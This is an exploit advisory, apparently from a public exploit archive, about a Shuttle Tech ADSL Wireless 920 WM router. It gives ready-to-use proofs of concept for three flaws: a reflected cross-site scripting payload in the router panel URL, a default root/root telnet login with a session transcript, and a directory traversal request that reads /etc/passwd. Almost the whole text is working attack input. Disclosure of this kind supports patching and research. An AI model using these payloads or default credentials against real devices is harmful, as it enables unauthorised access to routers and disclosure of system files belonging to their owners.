######################
# Exploit Title : Shuttle Tech ADSL WIRELESS 920 WM - Multiple Vulnerabilities
# Version: Gan9.8U6X-B-TW-R1B020_1T1RP
# Exploit Author : Persian Hack Team
# Tested on [ Win ]
# Date 2016/12/05
######################

1. Cross Site Scripting

PoC : First We Need To login To Panel And page Parameter Vulnerable to Cross Site Scripting
http://192.168.1.1/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=%3Cscript%3Ealert%28%22c_C%22%29%3C/script%3E


2. Default Telnet Root Password.txt

PoC : Username:root Password:root

telnet 192.168.1.1
(none) login: root
Password:root
~ $ cat /proc/version
Linux version 2.6.19 (dsl@crlinux) (gcc version 3.4.6-1.3.6) #3 Fri May 18 13:09:57 CST 2012


3. Directory Traversal.txt

PoC : First We Need To login To Panel And getpage Parameter Vulnerable to Local File Disclosure
http://192.168.1.1/cgi-bin/webproc?getpage=../../../../etc/passwd&var:menu=setup&var:page=